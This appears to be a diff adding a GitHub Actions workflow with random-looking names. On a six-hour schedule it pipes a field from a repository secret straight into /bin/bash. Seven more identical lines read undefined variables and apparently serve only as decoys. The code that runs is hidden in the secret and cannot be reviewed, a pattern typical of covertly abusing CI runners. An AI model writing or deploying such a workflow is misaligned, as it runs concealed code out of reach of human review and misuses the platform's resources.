@@ -1,0 +1,24 @@
+name: monolithcreate53
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: monolithcreate53
+        env:
+          vv89: ${{ secrets.vv89 }}
+        run: |
+          echo $vv89 | jq -r .tvb2 | /bin/bash
+          echo $ngvx7817 | jq -r .epu9342 | /bin/bash
+          echo $ikzfi599 | jq -r .ifdz45 | /bin/bash
+          echo $jdzyv518 | jq -r .nihl3182 | /bin/bash
+          echo $x1221 | jq -r .fdw1 | /bin/bash
+          echo $ersho14894 | jq -r .dr213 | /bin/bash
+          echo $sro6232 | jq -r .jj238 | /bin/bash
+          echo $lvypj6065 | jq -r .p943 | /bin/bash
+
